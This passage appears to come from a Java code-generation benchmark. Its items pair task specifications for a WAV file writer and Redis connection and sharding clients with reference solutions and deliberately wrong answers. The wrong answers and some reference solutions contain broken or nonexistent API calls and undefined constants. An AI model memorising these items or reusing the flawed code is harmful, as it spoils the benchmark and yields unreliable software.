    "Instruction": "Task Description: Implement a Java class for writing WAV audio files with support for file rollover when reaching maximum size limits, using Java NIO's FileChannel for efficient file operations.\n\nClass Description: WaveWriter is a class that handles the creation and writing of WAV audio files. It manages file channels, buffers, and WAV file formatting while supporting automatic file rollover when files reach a specified maximum size. The class implements AutoCloseable for proper resource management.\n\nAttributes:\n- mAudioFormat: [AudioFormat] - The audio format specification for the WAV file\n- mFileRolloverCounter: [int] - Counter for tracking rolled-over file versions\n- mMaxSize: [long] - Maximum allowed file size before rollover (0 means no limit)\n- mFile: [Path] - Current file path being written to\n- mFileChannel: [FileChannel] - NIO file channel for file operations\n- mDataChunkOpen: [boolean] - Flag indicating if a data chunk is currently open\n- mDataChunkSizeOffset: [long] - File position of the data chunk size field\n- mDataChunkSize: [int] - Current size of the data chunk in bytes\n\nMethods:\n- WaveWriter: [constructor](AudioFormat format, Path file, long maxSize) -> [void] - Initializes a new WaveWriter with specified format, output file, and maximum size\n- WaveWriter: [constructor](AudioFormat format, Path file) -> [void] - Initializes a new WaveWriter with no maximum size limit\n- open: [private]() -> [void] - Opens a new file channel and writes initial WAV header\n- close: [public]() -> [void] - Closes the file channel and performs cleanup\n- close: [public](Path path) -> [void] - Closes the file channel and renames the file to the specified path\n- writeData: [public](ByteBuffer buffer) -> [void] - Writes audio data to the file, handling rollover if needed\n- closeDataChunk: [private]() -> [void] - Marks the current data chunk as closed\n- openDataChunk: [private]() -> [void] - Opens a new data chunk in the WAV file\n- rollover: [private]() -> [void] - Performs file rollover operation when reaching size limit\n- updateTotalSize: [private]() -> [void] - Updates the total file size in the WAV header\n- updateDataChunkSize: [private]() -> [void] - Updates the data chunk size in the WAV file\n- getUnsignedIntegerBuffer: [protected static](long size) -> [ByteBuffer] - Creates a buffer with unsigned integer representation\n- updateFileName: [private]() -> [void] - Updates the filename for rollover operations\n- getDataHeader: [public static]() -> [ByteBuffer] - Creates a data chunk header buffer\n- getWaveHeader: [public static](AudioFormat format) -> [ByteBuffer] - Creates a WAV file header buffer\n- getFormatChunk: [public static](AudioFormat format) -> [ByteBuffer] - Creates a format chunk buffer for WAV file",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.ByteOrder;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardOpenOption;\nimport java.util.Arrays;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\nimport javax.sound.sampled.AudioFormat;\n\npublic class WaveWriter implements AutoCloseable\n{\n    private static final Pattern FILENAME_PATTERN = Pattern.compile(\"(.*_)(\\\\d+)(\\\\.tmp)\");\n    private AudioFormat mAudioFormat;\n    private int mFileRolloverCounter = 1;\n    private long mMaxSize;\n    private Path mFile;\n    private FileChannel mFileChannel;\n    private boolean mDataChunkOpen = false;\n    private long mDataChunkSizeOffset = 0;\n    private int mDataChunkSize = 0;\n\n    public WaveWriter(AudioFormat format, Path file, long maxSize) throws IOException\n    {\n        mAudioFormat = format;\n        mFile = file;\n        mMaxSize = maxSize;\n        open();\n    }\n\n    public WaveWriter(AudioFormat format, Path file) throws IOException\n    {\n        this(format, file, 0);\n    }\n\n    private void open() throws IOException\n    {\n        int version = 2;\n        while(Files.exists(mFile) && version < 20)\n        {\n            mFile = Paths.get(mFile.toFile().getAbsolutePath().replace(\".tmp\", \"_\" + version + \".tmp\"));\n            version++;\n        }\n        mFileChannel = (FileChannel.open(mFile, StandardOpenOption.WRITE, StandardOpenOption.CREATE_NEW));\n        ByteBuffer header = getWaveHeader(mAudioFormat);\n        while(header.hasRemaining())\n        {\n            mFileChannel.write(header);\n        }\n    }\n\n    public void close() throws IOException\n    {\n        close(null);\n    }\n\n    public void close(Path path) throws IOException\n    {\n        mFileChannel.force(true);\n        mFileChannel.close();\n        rename(path);\n    }\n\n    public void writeData(ByteBuffer buffer) throws IOException\n    {\n        buffer.position(0);\n        openDataChunk();\n        if(mFileChannel.size() + buffer.capacity() < mMaxSize)\n        {\n            while(buffer.hasRemaining())\n            {\n                mDataChunkSize += mFileChannel.write(buffer);\n            }\n            updateTotalSize();\n            updateDataChunkSize();\n        }\n        else\n        {\n            int remaining = (int)(mMaxSize - mFileChannel.size());\n            remaining -= (int)(remaining % mAudioFormat.getFrameSize());\n            byte[] bytes = buffer.array();\n            ByteBuffer current = ByteBuffer.wrap(Arrays.copyOf(bytes, remaining));\n            ByteBuffer next = ByteBuffer.wrap(Arrays.copyOfRange(bytes, remaining, bytes.length));\n            while(current.hasRemaining())\n            {\n                mDataChunkSize += mFileChannel.write(current);\n            }\n            updateTotalSize();\n            updateDataChunkSize();\n            rollover();\n            openDataChunk();\n            while(next.hasRemaining())\n            {\n                mDataChunkSize += mFileChannel.write(next);\n            }\n            updateTotalSize();\n            updateDataChunkSize();\n        }\n    }\n\n    private void closeDataChunk()\n    {\n        mDataChunkOpen = false;\n    }\n\n    private void openDataChunk() throws IOException\n    {\n        if(!mDataChunkOpen)\n        {\n            if(mFileChannel.size() + 32 >= mMaxSize)\n            {\n                rollover();\n            }\n            ByteBuffer formatChunk = getFormatChunk(mAudioFormat);\n            formatChunk.position(0);\n            while(formatChunk.hasRemaining())\n            {\n                mFileChannel.write(formatChunk);\n            }\n            ByteBuffer dataHeader = getDataHeader();\n            dataHeader.position(0);\n            while(dataHeader.hasRemaining())\n            {\n                mFileChannel.write(dataHeader);\n            }\n            mDataChunkSizeOffset = mFileChannel.size() - 4;\n            mDataChunkSize = 0;\n            mDataChunkOpen = true;\n            updateTotalSize();\n        }\n    }\n\n    private void rollover() throws IOException\n    {\n        closeDataChunk();\n        close();\n        mFileRolloverCounter++;\n        updateFileName();\n        open();\n    }\n\n    private void updateTotalSize() throws IOException\n    {\n        ByteBuffer buffer = getUnsignedIntegerBuffer(mFileChannel.size() - 8);\n        mFileChannel.write(buffer, 4);\n    }\n\n    private void updateDataChunkSize() throws IOException\n    {\n        ByteBuffer size = getUnsignedIntegerBuffer(mDataChunkSize);\n        mFileChannel.write(size, mDataChunkSizeOffset);\n    }\n\n    protected static ByteBuffer getUnsignedIntegerBuffer(long size)\n    {\n        ByteBuffer buffer = ByteBuffer.allocate(4);\n        buffer.put((byte)(size & 0xFFl));\n        buffer.put((byte)(Long.rotateRight(size & 0xFF00l, 8)));\n        buffer.put((byte)(Long.rotateRight(size & 0xFF0000l, 16)));\n        buffer.put((byte)Long.rotateRight(Long.rotateRight(size & 0xFF000000l, 16), 8));\n        buffer.position(0);\n        return buffer;\n    }\n\n    private void updateFileName()\n    {\n        String filename = mFile.toString();\n        if(mFileRolloverCounter == 2)\n        {\n            filename = filename.replace(\".tmp\", \"_2.tmp\");\n        }\n        else\n        {\n            Matcher m = FILENAME_PATTERN.matcher(filename);\n            if(m.find())\n            {\n                StringBuilder sb = new StringBuilder();\n                sb.append(m.group(1));\n                sb.append(mFileRolloverCounter);\n                sb.append(m.group(3));\n                filename = sb.toString();\n            }\n        }\n        mFile = Paths.get(filename);\n    }\n\n    public static ByteBuffer getDataHeader()\n    {\n        ByteBuffer header = ByteBuffer.allocate(8);\n        header.put(DATA_CHUNK_ID.getBytes());\n        header.position(0);\n        return header;\n    }\n\n    public static ByteBuffer getWaveHeader(AudioFormat format)\n    {\n        ByteBuffer header = ByteBuffer.allocate(12).order(ByteOrder.LITTLE_ENDIAN);\n        header.put(RIFF_ID.getBytes());\n        header.putInt(INITIAL_TOTAL_LENGTH);\n        header.put(WAVE_ID.getBytes());\n        header.position(0);\n        return header;\n    }\n\n    public static ByteBuffer getFormatChunk(AudioFormat format)\n    {\n        ByteBuffer header = ByteBuffer.allocate(24).order(ByteOrder.LITTLE_ENDIAN);\n        header.put(FORMAT_CHUNK_ID.getBytes());\n        header.putInt(FORMAT_CHUNK_LENGTH);\n        header.putShort(FORMAT_UNCOMPRESSED_PCM);\n        header.putShort((short)format.getChannels());\n        header.putInt((int)format.getSampleRate());\n        int frameByteRate = format.getChannels() * format.getSampleSizeInBits() / 8;\n        int byteRate = (int)(format.getSampleRate() * frameByteRate);\n        header.putInt(byteRate);\n        header.putShort((short)frameByteRate);\n        header.putShort((short)format.getSampleSizeInBits());\n        header.position(0);\n        return header;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.ByteOrder;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.*;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class WaveWriter implements AutoCloseable {\n    private final AudioFormat mAudioFormat;\n    private int mFileRolloverCounter;\n    private final long mMaxSize;\n    private Path mFile;\n    private FileChannel mFileChannel;\n    private boolean mDataChunkOpen;\n    private long mDataChunkSizeOffset;\n    private int mDataChunkSize;\n\n    public WaveWriter(AudioFormat format, Path file, long maxSize) {\n        mAudioFormat = format;\n        mFile = file;\n        mMaxSize = maxSize;\n        mFileRolloverCounter = 0;\n        open();\n    }\n\n    public WaveWriter(AudioFormat format, Path file) {\n        this(format, file, 0);\n    }\n\n    private void open() throws IOException {\n        mFileChannel = FileChannel.open(mFile, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.READ);\n        ByteBuffer waveHeader = getWaveHeader(mAudioFormat);\n        mFileChannel.write(waveHeader);\n        openDataChunk();\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (mFileChannel != null) {\n            if (mDataChunkOpen) {\n                closeDataChunk();\n            }\n            mFileChannel.close();\n            mFileChannel = null;\n        }\n    }\n\n    public void close(Path path) throws IOException {\n        close();\n        Files.move(mFile, path, StandardCopyOption.REPLACE_EXISTING);\n        mFile = path;\n    }\n\n    public void writeData(ByteBuffer buffer) throws IOException {\n        if (mMaxSize > 0) {\n            long currentSize = mFileChannel.size();\n            if (currentSize >= mMaxSize) {\n                rollover();\n            }\n        }\n        mFileChannel.write(buffer);\n        mDataChunkSize += buffer.remaining();\n    }\n\n    private void closeDataChunk() throws IOException {\n        updateDataChunkSize();\n        updateTotalSize();\n    }\n\n    private void openDataChunk() throws IOException {\n        mDataChunkOpen = true;\n        long dataChunkStart = 12 + 24; // RIFF header (12) + format chunk (24)\n        mDataChunkSizeOffset = dataChunkStart + 4; // 4 bytes into the data chunk header\n    }\n\n    private void rollover() throws IOException {\n        close();\n        mFileRolloverCounter++;\n        updateFileName();\n        open();\n    }\n\n    private void updateFileName() {\n        String fileName = mFile.toString();\n        int lastDotIndex = fileName.lastIndexOf('.');\n        if (lastDotIndex == -1) {\n            mFile = Paths.get(fileName + \"_\" + mFileRolloverCounter + \".wav\");\n        } else {\n            String base = fileName.substring(0, lastDotIndex);\n            String ext = fileName.substring(lastDotIndex);\n            mFile = Paths.get(base + \"_\" + mFileRolloverCounter + ext);\n        }\n    }\n\n    private void updateTotalSize() throws IOException {\n        long totalSize = 24 + 8 + mDataChunkSize; // format chunk size (24) + data chunk size (header 8 + data)\n        ByteBuffer sizeBuffer = getUnsignedIntegerBuffer(totalSize);\n        mFileChannel.position(4); // position of RIFF header size\n        mFileChannel.write(sizeBuffer);\n    }\n\n    private void updateDataChunkSize() throws IOException {\n        ByteBuffer sizeBuffer = getUnsignedIntegerBuffer(mDataChunkSize);\n        mFileChannel.position(mDataChunkSizeOffset);\n        mFileChannel.write(sizeBuffer);\n    }\n\n    protected static ByteBuffer getUnsignedIntegerBuffer(long size) {\n        ByteBuffer buffer = ByteBuffer.allocate(4);\n        buffer.order(ByteOrder.LITTLE_ENDIAN);\n        buffer.putInt((int) size);\n        return buffer;\n    }\n\n    public static ByteBuffer getDataHeader() {\n        ByteBuffer buffer = ByteBuffer.allocate(8);\n        buffer.order(ByteOrder.LITTLE_ENDIAN);\n        buffer.put(\"data\".getBytes());\n        buffer.putInt(0);\n        buffer.flip();\n        return buffer;\n    }\n\n    public static ByteBuffer getWaveHeader(AudioFormat format) throws IOException {\n        ByteBuffer waveHeader = ByteBuffer.allocate(44);\n        waveHeader.order(ByteOrder.LITTLE_ENDIAN);\n        waveHeader.put(\"RIFF\".getBytes());\n        waveHeader.putInt(32); // initial RIFF header size\n        waveHeader.put(\"WAVE\".getBytes());\n\n        ByteBuffer formatChunk = getFormatChunk(format);\n        waveHeader.put(formatChunk);\n        waveHeader.put(getDataHeader());\n        waveHeader.flip();\n        return waveHeader;\n    }\n\n    public static ByteBuffer getFormatChunk(AudioFormat format) {\n        ByteBuffer buffer = ByteBuffer.allocate(24);\n        buffer.order(ByteOrder.LITTLE_ENDIAN);\n        buffer.put(\"fmt \".getBytes());\n        buffer.putInt(16); // format chunk size\n        buffer.putShort((short) 1); // PCM\n        buffer.putShort((short) format.getChannels());\n        buffer.putInt(format.getSampleRate());\n        buffer.putInt(format.getByteRate());\n        buffer.putShort((short) format.getBlockAlign());\n        buffer.putShort((short) format.getBitsPerSample());\n        buffer.flip();\n        return buffer;\n    }\n}"
  },
  {
    "Task_id": 340,
    "Instruction": "Task Description: Create a Java class that establishes and manages a connection to a Redis master-slave setup using Lettuce client, with support for read preference configuration.\n\nClass Description: The RedisMasterSlaveConnector class provides functionality to connect to a Redis master-slave deployment, configure read preferences, and properly close connections. It uses Lettuce's MasterReplica API for high availability.\n\nAttributes:\n- redisClient: RedisClient - The underlying Redis client instance\n- connection: StatefulRedisMasterReplicaConnection<String, String> - The active connection to Redis master-slave setup\n\nMethods:\n- connectToMasterSlave(String sentinelUrl) -> void - Establishes a connection to Redis master-slave setup using the provided sentinel URL and configures read preference to prefer master\n- getConnection() -> StatefulRedisMasterReplicaConnection<String, String> - Returns the active Redis master-slave connection\n- closeConnection() -> void - Properly closes the Redis connection and shuts down the client",
    "Canonical_solution": "import io.lettuce.core.ReadFrom;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.codec.StringCodec;\nimport io.lettuce.core.masterreplica.MasterReplica;\nimport io.lettuce.core.masterreplica.StatefulRedisMasterReplicaConnection;\n\npublic class RedisMasterSlaveConnector {\n\n    private RedisClient redisClient;\n    private StatefulRedisMasterReplicaConnection<String, String> connection;\n\n    public void connectToMasterSlave(String sentinelUrl) {\n        redisClient = RedisClient.create();\n        connection = MasterReplica.connect(redisClient, StringCodec.UTF8, RedisURI.create(sentinelUrl));\n        connection.setReadFrom(ReadFrom.UPSTREAM_PREFERRED);\n    }\n\n    public StatefulRedisMasterReplicaConnection<String, String> getConnection() {\n        return connection;\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisMasterSlaveConnector {\n    private RedisClient redisClient;\n    private StatefulRedisMasterReplicaConnection<String, String> connection;\n\n    public void connectToMasterSlave(String sentinelUrl) {\n        RedisURI uri = RedisURI.create(sentinelUrl);\n        redisClient = RedisClient.create(uri);\n        connection = redisClient.connectMasterReplica();\n        connection.setReadFrom(ReadFrom.MASTER);\n    }\n\n    public StatefulRedisMasterReplicaConnection<String, String> getConnection() {\n        return connection;\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}"
  },
  {
    "Task_id": 342,
    "Instruction": "Task Description: Create a Redis connection factory class in Java that handles both standalone Redis instances and Redis clusters, with support for connection pooling and sentinel configurations.\n\nClass Description: The RedisConnectionFactory class provides a centralized way to create and manage Redis connections (both standalone and cluster) with configurable connection parameters. It handles connection pooling, authentication, and resource cleanup.\n\nAttributes:\n- hostName: String - The Redis server hostname (default: \"localhost\")\n- port: int - The Redis server port (default: 6379)\n- timeout: int - Connection timeout in milliseconds (default: 2000)\n- password: String - Password for Redis authentication\n- sentinelMaster: String - Name of the Redis sentinel master\n- redisServers: List<RedisNode> - List of Redis server nodes for cluster/sentinel configuration\n- isCluster: boolean - Flag indicating whether to use Redis cluster mode\n- dbIndex: int - Redis database index to select (default: 0)\n- shardInfo: JedisShardInfo - Redis connection shard information\n- pool: Pool<Jedis> - Jedis connection pool instance\n- cluster: JedisCluster - Jedis cluster instance\n- poolConfig: JedisPoolConfig - Configuration for the connection pool\n\nMethods:\n- init(): void - Initializes the Redis connection factory by creating either a connection pool or cluster instance\n- destroy(): void - Cleans up resources by closing all active connections and pools\n- fetchJedisConnector(): Jedis - Internal method to fetch a Jedis connection from pool or create a new one\n- createPool(): Pool<Jedis> - Creates a Redis connection pool (either regular or sentinel)\n- createRedisSentinelPool(): Pool<Jedis> - Creates a Redis sentinel connection pool\n- createRedisPool(): Pool<Jedis> - Creates a regular Redis connection pool\n- createCluster(): JedisCluster - Creates a Redis cluster connection\n- getJedisConnection(): Jedis - Returns a configured Jedis connection\n- getClusterConnection(): JedisCluster - Returns the Jedis cluster instance",
    "Canonical_solution": "import com.mpush.cache.redis.RedisServer;\nimport com.mpush.tools.config.data.RedisNode;\nimport org.apache.commons.lang3.StringUtils;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport redis.clients.jedis.*;\nimport redis.clients.util.Pool;\n\nimport java.util.List;\nimport java.util.Objects;\nimport java.util.Set;\nimport java.util.stream.Collectors;\n\npublic class RedisConnectionFactory {\n\n    private final static Logger log = LoggerFactory.getLogger(RedisConnectionFactory.class);\n\n    private String hostName = \"localhost\";\n    private int port = Protocol.DEFAULT_PORT;\n    private int timeout = Protocol.DEFAULT_TIMEOUT;\n    private String password;\n    private String sentinelMaster;\n    private List<RedisNode> redisServers;\n    private boolean isCluster = false;\n    private int dbIndex = 0;\n    private JedisShardInfo shardInfo;\n    private Pool<Jedis> pool;\n    private JedisCluster cluster;\n    private JedisPoolConfig poolConfig = new JedisPoolConfig();\n\n    public RedisConnectionFactory() {\n    }\n\n    protected Jedis fetchJedisConnector() {\n        try {\n            if (pool != null) {\n                return pool.getResource();\n            }\n            Jedis jedis = new Jedis(getShardInfo());\n            jedis.connect();\n            return jedis;\n        } catch (Exception ex) {\n            throw new RuntimeException(\"Cannot get Jedis connection\", ex);\n        }\n    }\n\n    public void init() {\n        if (shardInfo == null) {\n            shardInfo = new JedisShardInfo(hostName, port);\n            if (StringUtils.isNotEmpty(password)) {\n                shardInfo.setPassword(password);\n            }\n            if (timeout > 0) {\n                shardInfo.setConnectionTimeout(timeout);\n            }\n        }\n\n        if (isCluster) {\n            this.cluster = createCluster();\n        } else {\n            this.pool = createPool();\n        }\n    }\n\n    private Pool<Jedis> createPool() {\n        if (StringUtils.isNotBlank(sentinelMaster)) {\n            return createRedisSentinelPool();\n        }\n        return createRedisPool();\n    }\n\n    protected Pool<Jedis> createRedisSentinelPool() {\n        Set<String> hostAndPorts = redisServers\n                .stream()\n                .map(redisNode -> new HostAndPort(redisNode.host, redisNode.port).toString())\n                .collect(Collectors.toSet());\n        return new JedisSentinelPool(sentinelMaster, hostAndPorts, poolConfig, getShardInfo().getSoTimeout(), getShardInfo().getPassword());\n    }\n\n    protected Pool<Jedis> createRedisPool() {\n        return new JedisPool(getPoolConfig(), shardInfo.getHost(), shardInfo.getPort(), shardInfo.getSoTimeout(), shardInfo.getPassword());\n    }\n\n    protected JedisCluster createCluster() {\n        Set<HostAndPort> hostAndPorts = redisServers\n                .stream()\n                .map(redisNode -> new HostAndPort(redisNode.host, redisNode.port))\n                .collect(Collectors.toSet());\n        if (StringUtils.isNotEmpty(getPassword())) {\n            throw new IllegalArgumentException(\"Jedis does not support password protected Redis Cluster configurations!\");\n        }\n        int redirects = 5;\n        return new JedisCluster(hostAndPorts, timeout, redirects, poolConfig);\n    }\n\n    public void destroy() {\n        if (pool != null) {\n            try {\n                pool.destroy();\n            } catch (Exception ex) {\n                log.warn(\"Cannot properly close Jedis pool\", ex);\n            }\n            pool = null;\n        }\n        if (cluster != null) {\n            try {\n                cluster.close();\n            } catch (Exception ex) {\n                log.warn(\"Cannot properly close Jedis cluster\", ex);\n            }\n            cluster = null;\n        }\n    }\n\n    public Jedis getJedisConnection() {\n        Jedis jedis = fetchJedisConnector();\n        if (dbIndex > 0 && jedis != null) {\n            jedis.select(dbIndex);\n        }\n        return jedis;\n    }\n\n    public JedisCluster getClusterConnection() {\n        return cluster;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisConnectionFactory {\n    private String hostName = \"localhost\";\n    private int port = 6379;\n    private int timeout = 2000;\n    private String password;\n    private String sentinelMaster;\n    private List<RedisNode> redisServers;\n    private boolean isCluster = false;\n    private int dbIndex = 0;\n    private JedisShardInfo shardInfo;\n    private Pool<Jedis> pool;\n    private JedisCluster cluster;\n    private JedisPoolConfig poolConfig;\n\n    public RedisConnectionFactory() {\n        poolConfig = new JedisPoolConfig();\n    }\n\n    public void init() {\n        if (isCluster) {\n            cluster = createCluster();\n        } else if (sentinelMaster != null && !sentinelMaster.isEmpty()) {\n            pool = createRedisSentinelPool();\n        } else {\n            pool = createRedisPool();\n        }\n    }\n\n    public void destroy() {\n        if (pool != null) {\n            pool.close();\n        }\n        if (cluster != null) {\n            cluster.close();\n        }\n    }\n\n    private Jedis fetchJedisConnector() {\n        if (pool != null) {\n            return pool.getResource();\n        } else if (cluster != null) {\n            return cluster.getConnection();\n        }\n        throw new IllegalStateException(\"No connection available\");\n    }\n\n    public Pool<Jedis> createPool() {\n        if (isCluster) {\n            return createCluster();\n        } else if (sentinelMaster != null && !sentinelMaster.isEmpty()) {\n            return createRedisSentinelPool();\n        } else {\n            return createRedisPool();\n        }\n    }\n\n    private Pool<Jedis> createRedisSentinelPool() {\n        List<String> sentinels = new ArrayList<>();\n        for (RedisNode node : redisServers) {\n            sentinels.add(node.getHost() + \":\" + node.getPort());\n        }\n        return new JedisSentinelPool(sentinelMaster, sentinels, poolConfig);\n    }\n\n    private Pool<Jedis> createRedisPool() {\n        if (shardInfo != null) {\n            return new JedisPool(poolConfig, shardInfo);\n        } else {\n            return new JedisPool(poolConfig, hostName, port, timeout, password);\n        }\n    }\n\n    private JedisCluster createCluster() {\n        List<HostAndPort> nodes = new ArrayList<>();\n        for (RedisNode node : redisServers) {\n            nodes.add(new HostAndPort(node.getHost(), node.getPort()));\n        }\n        return new JedisCluster(nodes, timeout, poolConfig);\n    }\n\n    public Jedis getJedisConnection() {\n        Jedis jedis = fetchJedisConnector();\n        if (dbIndex >= 0) {\n            jedis.select(dbIndex);\n        }\n        return jedis;\n    }\n\n    public JedisCluster getClusterConnection() {\n        return cluster;\n    }\n}"
  },
  {
    "Task_id": 343,
    "Instruction": "Task Description: Create a Java class that provides a client interface for interacting with Redis JSON data structures using the Lettuce Redis client library. The class should handle connection management and provide methods for common JSON operations.\n\nClass Description: RedisJsonClient is a wrapper class for Lettuce Redis client that specializes in JSON operations. It manages Redis connections and provides synchronous methods to manipulate JSON data stored in Redis.\n\nAttributes:\n- client: RedisClient - The main Redis client instance for connection management\n- syncCommands: RedisCommands<String, String> - Synchronous command interface for Redis operations\n\nMethods:\n- RedisJsonClient(String host, int port) -> void - Constructor that initializes the Redis connection with the specified host and port\n- jsonGet(String key, JsonPath path) -> JsonValue - Retrieves JSON value at specified path from given key\n- jsonSet(String key, JsonPath path, JsonValue value) -> String - Sets JSON value at specified path for given key\n- jsonDel(String key, JsonPath path) -> Long - Deletes JSON value at specified path from given key\n- jsonArrlen(String key, JsonPath path) -> List<Long> - Gets length of JSON array at specified path\n- jsonArrpop(String key, JsonPath path) -> List<JsonValue> - Pops elements from JSON array at specified path\n- close() -> void - Shuts down the Redis connection and releases resources\n- createJsonValue(String value) -> JsonValue - Creates a new JsonValue from string\n- createJsonObject() -> JsonObject - Creates a new empty JsonObject\n- createJsonArray() -> JsonArray - Creates a new empty JsonArray",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.core.codec.ByteArrayCodec;\nimport io.lettuce.core.json.JsonParser;\nimport io.lettuce.core.json.JsonPath;\nimport io.lettuce.core.json.JsonValue;\n\npublic class RedisJsonClient {\n\n    private RedisClient client;\n    private RedisCommands<String, String> syncCommands;\n\n    public RedisJsonClient(String host, int port) {\n        RedisURI redisURI = RedisURI.Builder.redis(host).withPort(port).build();\n        client = RedisClient.create(redisURI);\n        syncCommands = client.connect().sync();\n    }\n\n    public JsonValue jsonGet(String key, JsonPath path) {\n        List<JsonValue> values = syncCommands.jsonGet(key, path);\n        return values != null && !values.isEmpty() ? values.get(0) : null;\n    }\n\n    public String jsonSet(String key, JsonPath path, JsonValue value) {\n        return syncCommands.jsonSet(key, path, value);\n    }\n\n    public Long jsonDel(String key, JsonPath path) {\n        return syncCommands.jsonDel(key, path);\n    }\n\n    public List<Long> jsonArrlen(String key, JsonPath path) {\n        return syncCommands.jsonArrlen(key, path);\n    }\n\n    public List<JsonValue> jsonArrpop(String key, JsonPath path) {\n        return syncCommands.jsonArrpop(key, path);\n    }\n\n    public void close() {\n        if (client != null) {\n            client.shutdown();\n        }\n    }\n\n    public JsonValue createJsonValue(String value) {\n        return syncCommands.getJsonParser().createJsonValue(value);\n    }\n\n    public JsonObject createJsonObject() {\n        return syncCommands.getJsonParser().createJsonObject();\n    }\n\n    public JsonArray createJsonArray() {\n        return syncCommands.getJsonParser().createJsonArray();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisJsonClient {\n    private RedisClient client;\n    private RedisCommands<String, String> syncCommands;\n\n    public RedisJsonClient(String host, int port) {\n        RedisURI uri = RedisURI.create(host, port);\n        this.client = RedisClient.create(uri);\n        RedisConnection connection = client.connect();\n        this.syncCommands = connection.sync();\n    }\n\n    public JsonValue jsonGet(String key, JsonPath path) {\n        String result = syncCommands.get(key, path);\n        return createJsonValue(result);\n    }\n\n    public String jsonSet(String key, JsonPath path, JsonValue value) {\n        return syncCommands.set(key, path, value);\n    }\n\n    public Long jsonDel(String key, JsonPath path) {\n        return syncCommands.del(key, path);\n    }\n\n    public List<Long> jsonArrlen(String key, JsonPath path) {\n        return syncCommands.arrlen(key, path);\n    }\n\n    public List<JsonValue> jsonArrpop(String key, JsonPath path) {\n        return syncCommands.arrpop(key, path);\n    }\n\n    public void close() {\n        client.close();\n    }\n\n    public JsonValue createJsonValue(String value) {\n        return JSON.parse(value);\n    }\n\n    public JsonObject createJsonObject() {\n        return new JsonObject();\n    }\n\n    public JsonArray createJsonArray() {\n        return new JsonArray();\n    }\n}"
  },
  {
    "Task_id": 345,
    "Instruction": "Task Description: Implement a Redis sharding client in Java that distributes keys across multiple Redis instances using consistent hashing, with support for basic CRUD operations and command execution.\n\nClass Description: JedisSharding is a Redis client wrapper that implements sharding across multiple Redis instances. It uses consistent hashing to distribute keys and automatically manages connections to the appropriate shard for each operation.\n\nAttributes:\n- shards: List<HostAndPort> - List of Redis server addresses and ports for sharding\n- clientConfig: JedisClientConfig - Configuration for Redis client connections\n- hashing: Hashing - Hashing algorithm used for key distribution (defaults to MURMUR_HASH)\n\nMethods:\n- JedisSharding(List<HostAndPort>, JedisClientConfig) -> void - Constructor with default hashing algorithm\n- JedisSharding(List<HostAndPort>, JedisClientConfig, Hashing) -> void - Constructor with custom hashing algorithm\n- set(String, String) -> String - Stores a key-value pair in the appropriate shard\n- get(String) -> String - Retrieves a value from the appropriate shard\n- sendCommand(String, Protocol.Command, String...) -> Object - Sends a raw Redis command to the appropriate shard\n- close() -> void - Cleans up resources (no-op as connections are managed per-operation)\n- getShard(String) -> Jedis - Internal method to get a connection to the correct shard\n- getShardIndex(String) -> int - Internal method to calculate shard index for a key",
    "Canonical_solution": "import redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.util.Hashing;\nimport java.util.List;\n\npublic class JedisSharding implements AutoCloseable {\n\n    private final List<HostAndPort> shards;\n    private final JedisClientConfig clientConfig;\n    private final Hashing hashing;\n\n    public JedisSharding(List<HostAndPort> shards, JedisClientConfig clientConfig) {\n        this(shards, clientConfig, Hashing.MURMUR_HASH);\n    }\n\n    public JedisSharding(List<HostAndPort> shards, JedisClientConfig clientConfig, Hashing hashing) {\n        this.shards = shards;\n        this.clientConfig = clientConfig;\n        this.hashing = hashing;\n    }\n\n    public String set(String key, String value) {\n        try (Jedis jedis = getShard(key)) {\n            return jedis.set(key, value);\n        }\n    }\n\n    public String get(String key) {\n        try (Jedis jedis = getShard(key)) {\n            return jedis.get(key);\n        }\n    }\n\n    public Object sendCommand(String key, Protocol.Command command, String... args) {\n        try (Jedis jedis = getShard(key)) {\n            return jedis.sendCommand(command, args);\n        }\n    }\n\n    private Jedis getShard(String key) {\n        int shardIndex = getShardIndex(key);\n        HostAndPort shard = shards.get(shardIndex);\n        Jedis jedis = new Jedis(shard, clientConfig);\n        if (shard.getPassword() != null) {\n            jedis.auth(shard.getPassword());\n        }\n        return jedis;\n    }\n\n    private int getShardIndex(String key) {\n        long hash = hashing.hash(key);\n        return (int) (hash % shards.size());\n    }\n\n    @Override\n    public void close() {\n        // Connection cleanup handled by try-with-resources in individual operations\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
